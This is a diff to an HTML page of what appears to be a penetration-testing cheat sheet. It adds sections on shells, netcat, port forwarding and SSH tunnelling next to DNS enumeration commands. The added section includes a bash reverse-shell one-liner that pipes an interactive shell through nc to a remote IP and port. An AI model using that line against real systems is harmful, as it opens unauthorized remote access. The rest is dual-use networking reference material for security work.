@@ -178,12 +178,58 @@
 <div style="break-before: page; page-break-before: always;"></div><h1 id="enumeration"><a class="header" href="#enumeration">Enumeration</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="folders"><a class="header" href="#folders">Folders</a></h1>
 <h2 id="fuzzers"><a class="header" href="#fuzzers">Fuzzers</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="shellwerkz"><a class="header" href="#shellwerkz">shellwerkz</a></h1>
+<h1 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse shell</a></h1>
+<h2 id="bash"><a class="header" href="#bash">bash</a></h2>
+<pre><code class="language-bash">mkfifo /tmp/ffifo; /bin/bash -i &lt; /tmp/ffifo 2&gt;&amp;1 | nc $remote_ip $port &gt; /tmp/ffifo
+</code></pre>
+<p>You may need to use <a href="./netcat.html"><code>nc</code> with a proxy</a>.</p>
+<h1 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h1>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="name-server-detection"><a class="header" href="#name-server-detection">Name Server detection</a></h1>
 <h2 id="dig"><a class="header" href="#dig">dig</a></h2>
 <pre><code class="language-bash">dig ns &lt;domain&gt; +short
 </code></pre>
 <h2 id="host"><a class="header" href="#host">host</a></h2>
 <pre><code class="language-bash">host -t ns &lt;domain&gt;
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="netcat"><a class="header" href="#netcat">netcat</a></h1>
+<h2 id="listen"><a class="header" href="#listen">listen</a></h2>
+<pre><code class="language-bash">nc -lvp $port
+</code></pre>
+<h2 id="connect"><a class="header" href="#connect">connect</a></h2>
+<pre><code class="language-bash">nc $host $port -v
+</code></pre>
+<h2 id="connect-with-proxy"><a class="header" href="#connect-with-proxy">connect with proxy</a></h2>
+<pre><code class="language-bash">nc -X connect -x $proxy_host:$proxy_port $host $port -v
+</code></pre>
+<h2 id="forward-a-local-port-to-another-local-port"><a class="header" href="#forward-a-local-port-to-another-local-port">forward a local port to another local port</a></h2>
+<pre><code class="language-bash">mkfifo /tmp/f;
+nc -lpv $to &lt; /tmp/f | nc localhost $from &gt; /tmp/f
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="port-forwarding"><a class="header" href="#port-forwarding">Port forwarding</a></h1>
+<p>You can "always" use <a href="./ssh.html">ssh</a>.</p>
+<h2 id="forward-a-local-port-to-another-local-port-1"><a class="header" href="#forward-a-local-port-to-another-local-port-1">forward a local port to another local port</a></h2>
+<h3 id="nc"><a class="header" href="#nc">nc</a></h3>
+<pre><code class="language-bash">mkfifo /tmp/f;
+nc -lvp $to &lt; /tmp/f | nc localhost $from &gt; /tmp/f
+</code></pre>
+<p>For instance, you can use this to forward the port 22 to the 443.</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="ssh"><a class="header" href="#ssh">SSH</a></h1>
+<h2 id="local-port-forwarding"><a class="header" href="#local-port-forwarding">Local port forwarding</a></h2>
+<pre><code class="language-bash">ssh -L $lport:$dhost:$dport $user@$sshserver
+
+</code></pre>
+<h2 id="remote-port-forwarding"><a class="header" href="#remote-port-forwarding">Remote port forwarding</a></h2>
+<pre><code class="language-bash">ssh -R $rport:$dhost:$lport $user@$sshserver
+
+</code></pre>
+<pre><code>B:1 -&gt; A:2 &lt;- C:3  &lt;---&gt; internet
+</code></pre>
+<blockquote>
+<p>NOTE: this option can be useless if you have no root access to change the <code>sshd_config</code> file in the machine <code>A</code>, and restart the ssh service, since you need to set <code>GatewayPorts yes</code> in order to let others than the ssh server machine could access to <code>dhost</code>. However, there's a workaround: Remote Port Forwarding from <code>B:port1</code> to one remote server <code>A:port2</code> and then a Local Port Forwarding to the same <code>A:port2</code> machine using a local machine <code>C:port3</code> to which you have more access. You can know access to the service in <code>B:port1</code> using <code>C:port3</code>.</p>
+</blockquote>
+<h2 id="dynamic-port-forwarding"><a class="header" href="#dynamic-port-forwarding">Dynamic port forwarding</a></h2>
+<pre><code class="language-bash">ssh -D $lport $user@$server
 </code></pre>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="dns-zone-transfer"><a class="header" href="#dns-zone-transfer">DNS Zone Transfer</a></h1>
 <h2 id="host-1"><a class="header" href="#host-1">host</a></h2>
